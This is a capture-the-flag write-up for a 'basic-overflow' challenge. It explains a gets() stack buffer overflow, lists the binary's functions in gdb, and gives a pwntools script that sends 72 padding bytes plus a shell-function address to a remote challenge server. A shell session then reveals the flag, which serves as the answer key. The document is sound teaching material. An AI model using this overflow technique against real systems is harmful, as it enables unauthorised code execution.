# Binary Exploitation

## basic-overflow

This challenge is simple.

It just gets input, stores it to a buffer.

It calls gets to read input, stores the read bytes to a buffer, then exits.

What is gets, you ask? Well, it's time you read the manual, no?

man 3 gets

Cryptic message from author: There are times when you tell them something, but they don't reply. In those cases, you must try again. Don't just shoot one shot; sometimes, they're just not ready yet.

File: https://cdn.discordapp.com/attachments/758115188796162088/1196758510529159188/basic-overflow?ex=65b8cb37&is=65a65637&hm=b7b63e4713cd015275e0d8e62937fcf51f951ff4fe47d81f9c93c2ec0f28e041&

---

### Solution

![decompile-main](https://media.discordapp.net/attachments/758115188796162088/1196756929658232882/image.png?ex=65b8c9be&is=65a654be&hm=2cb4f9cdf2e3fe9f2d87cb63c03152e623bbb3a5e274d7e60c747ada53b122dc&=&format=webp&quality=lossless&width=764&height=570)

![decompile-shell](https://media.discordapp.net/attachments/758115188796162088/1196944357052383263/image.png?ex=65b9784c&is=65a7034c&hm=deb98429523244f8fdd0a479d2c9a4c7fb8e8f23fc5b6cd9a31d15c9131cdd04&=&format=webp&quality=lossless&width=1048&height=502)


```bash
gdb-peda$ i functions 
All defined functions:

Non-debugging symbols:
0x0000000000401000  _init
0x0000000000401030  execve@plt
0x0000000000401040  gets@plt
0x0000000000401050  _start
0x0000000000401080  _dl_relocate_static_pie
0x0000000000401136  shell
0x0000000000401156  main
0x0000000000401178  _fini
```

There is vuln at gets function. Spamm the stack until it overwrite the return address, then change it to the shell function address.

I found 72 bytes to reach return address from main.

```python
from pwn import *

# p = process("basic-overflow")
p = remote("34.123.15.202", 5000)

payload = b'A'*72 + p64(0x0000000000401136)
p.sendline(payload)
p.interactive()

"""
[+] Opening connection to 34.123.15.202 on port 5000: Done
[*] Switching to interactive mode
$ ls
flag
run
$ cat flag
uoftctf{reading_manuals_is_very_fun}
"""
```

### uoftctf{reading_manuals_is_very_fun}